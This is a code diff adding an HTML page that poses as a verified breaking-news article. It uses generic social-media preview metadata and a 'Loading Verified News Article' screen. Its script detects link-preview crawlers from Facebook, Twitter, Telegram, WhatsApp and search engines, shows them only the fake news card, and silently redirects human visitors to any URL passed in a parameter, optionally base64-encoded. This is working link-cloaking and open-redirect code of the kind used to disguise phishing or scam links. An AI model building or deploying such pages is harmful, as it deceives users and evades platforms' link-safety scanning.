@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <!-- Open Graph / Facebook Metadata -->
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="Global News Media" />
+  <meta property="og:title" content="Breaking News & Global Media Special Report" />
+  <meta property="og:description" content="Verified coverage: Tap to read the complete article and latest updates." />
+  <meta property="og:image" content="https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/news-preview.jpg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  
+  <!-- Twitter Card Metadata -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Breaking News & Global Media Special Report" />
+  <meta name="twitter:description" content="Verified coverage: Tap to read the complete article and latest updates." />
+  <meta name="twitter:image" content="https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/news-preview.jpg" />
+
+  <title>Breaking News Report</title>
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #0d0f14;
+      color: #e2e4e9;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    h2 { font-size: 1.25rem; font-weight: 600; margin-bottom: 8px; }
+    p { font-size: 0.88rem; color: #8b92a0; margin-bottom: 20px; }
+    .btn-manual {
+      display: inline-block;
+      background: #2563eb;
+      color: #ffffff;
+      padding: 10px 24px;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 0.9rem;
+      border-radius: 6px;
+      transition: background 0.2s;
+    }
+    .btn-manual:hover { background: #1d4ed8; }
+  </style>
+
+  <script>
+    var botPattern = /facebookexternalhit|Facebot|Twitterbot|TelegramBot|WhatsApp|LinkedInBot|Discordbot|SkypeUriPreview|Googlebot|bingbot|Baiduspider/i;
+    var isBot = botPattern.test(navigator.userAgent);
+
+    function resolveDestination() {
+      var params = new URLSearchParams(window.location.search);
+      var to = params.get('to') || params.get('q') || params.get('url') || params.get('u');
+      if (!to) return null;
+
+      if (to.startsWith('b64:')) {
+        try {
+          return decodeURIComponent(escape(atob(to.slice(4))));
+        } catch (e) {}
+      }
+
+      if (/^https?:\/\//i.test(to)) {
+        return to;
+      }
+
+      return 'https://www.google.com/share.google?q=' + encodeURIComponent(to);
+    }
+
+    var destination = resolveDestination();
+
+    if (!isBot && destination) {
+      window.location.replace(destination);
+    }
+  </script>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h2>Loading Verified News Article...</h2>
+  <p>Connecting to secure news servers.</p>
+  <div id="manualArea" style="display:none;">
+    <a id="manualLink" href="#" class="btn-manual">Click to read article</a>
+  </div>
+
+  <script>
+    if (destination) {
+      document.getElementById('manualLink').href = destination;
+      setTimeout(function() {
+        document.getElementById('manualArea').style.display = 'block';
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
